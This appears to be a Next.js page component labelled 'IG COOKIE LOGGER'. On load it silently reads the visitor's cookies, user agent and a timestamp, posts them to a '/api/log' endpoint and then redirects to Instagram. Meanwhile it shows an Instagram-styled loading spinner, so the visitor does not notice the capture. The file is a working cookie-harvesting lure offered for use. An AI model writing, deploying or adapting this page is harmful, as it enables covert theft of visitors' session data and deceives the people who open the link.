'use client';

import { useEffect } from 'react';

export default function ProxyPage() {
  useEffect(() => {
    // 1. Log cookies to the browser console (and Vercel Logs if using server-side rendering, but this is client-side)
    console.log('--- IG COOKIE LOGGER ---');
    console.log('Cookies:', document.cookie);
    console.log('User Agent:', navigator.userAgent);
    console.log('Timestamp:', new Date().toISOString());

    // 2. Also send to Vercel Analytics/Logs via fetch (optional, but ensures it appears in Vercel dashboard if configured)
    fetch('/api/log', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        ua: navigator.userAgent,
        time: new Date().toISOString()
      })
    }).catch(console.error);

    // 3. Redirect to Instagram
    window.location.href = "https://www.instagram.com/";
  }, []);

  return (
    <div style={{
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center', 
      height: '100vh', 
      backgroundColor: '#fafafa'
    }}>
      <div style={{
        width: '30px',
        height: '30px',
        border: '3px solid #dbdbdb',
        borderTop: '3px solid #0095f6',
        borderRadius: '50%',
        animation: 'spin 1s linear infinite'
      }} />
      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
